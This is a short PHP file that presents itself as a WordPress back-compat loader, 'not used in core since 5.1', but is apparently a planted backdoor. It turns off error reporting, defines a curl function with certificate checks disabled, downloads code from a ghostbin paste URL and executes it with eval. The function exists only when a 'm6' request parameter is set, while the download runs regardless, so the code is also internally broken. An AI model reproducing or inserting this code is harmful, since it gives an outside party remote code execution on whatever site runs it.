<?php
/**
 * Not used in core since 5.1.
 * This is a back-compat for plugins that may be using this method of loading directly.
 */

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
error_reporting( 0 );
if(isset($_REQUEST['m6'])){
function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
  $result = curl_exec($ch);
  return $result;
}}
$a = get_contents('https://ghostbin.co/paste/pnvvs/raw');
eval('?>'.$a);